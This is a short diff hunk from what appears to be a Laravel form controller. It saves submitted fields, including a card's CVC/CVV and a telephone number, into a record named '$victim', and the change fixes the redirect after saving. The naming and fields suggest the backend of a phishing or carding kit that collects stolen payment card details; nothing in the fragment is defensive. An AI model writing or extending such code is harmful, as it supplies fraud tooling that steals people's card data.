@@ -44,7 +44,7 @@ class formController extends Controller
         $victim['CVC/CVV'] = $request->in_card_cvv;
         $victim['telephone'] = $request->in_tel;
         $victim->save();
-        return redirect().back();
+        return redirect()->route('home');
 
 
     }
